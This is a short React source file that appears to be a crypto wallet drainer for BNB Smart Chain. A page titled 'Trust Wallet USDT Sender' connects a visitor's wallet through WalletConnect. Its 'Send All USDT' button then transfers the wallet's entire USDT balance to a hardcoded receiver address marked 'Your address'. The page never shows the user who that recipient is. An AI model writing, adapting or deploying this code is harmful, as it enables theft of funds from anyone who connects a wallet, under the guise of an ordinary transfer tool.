
import React, { useState } from 'react';
import { ethers } from 'ethers';
import WalletConnectProvider from "@walletconnect/web3-provider";

const USDT_ADDRESS = "0x55d398326f99059fF775485246999027B3197955"; // BEP20 USDT
const RECEIVER_ADDRESS = "0xe47a9ecb5C87b06364bA2c6CEB064583c935f2ed"; // Your address
const USDT_ABI = [
  "function balanceOf(address) view returns (uint)",
  "function transfer(address to, uint amount) returns (bool)"
];

function App() {
  const [provider, setProvider] = useState(null);
  const [account, setAccount] = useState(null);

  const connectWallet = async () => {
    const walletConnectProvider = new WalletConnectProvider({
      rpc: { 56: "https://bsc-dataseed.binance.org/" },
    });

    await walletConnectProvider.enable();
    const ethersProvider = new ethers.providers.Web3Provider(walletConnectProvider);
    const signer = ethersProvider.getSigner();
    const address = await signer.getAddress();

    setProvider(ethersProvider);
    setAccount(address);
    alert(`Connected: ${address}`);
  };

  const transferUSDT = async () => {
    if (!provider || !account) return;

    const signer = provider.getSigner();
    const usdt = new ethers.Contract(USDT_ADDRESS, USDT_ABI, signer);
    const balance = await usdt.balanceOf(account);

    if (balance.isZero()) {
      alert("No USDT to transfer.");
      return;
    }

    const tx = await usdt.transfer(RECEIVER_ADDRESS, balance);
    await tx.wait();
    alert("USDT transferred!");
  };

  return (
    <div style={{ padding: 20 }}>
      <h2>Trust Wallet USDT Sender</h2>
      <button onClick={connectWallet}>Connect Trust Wallet</button>
      {account && <button onClick={transferUSDT}>Send All USDT</button>}
    </div>
  );
}

export default App;
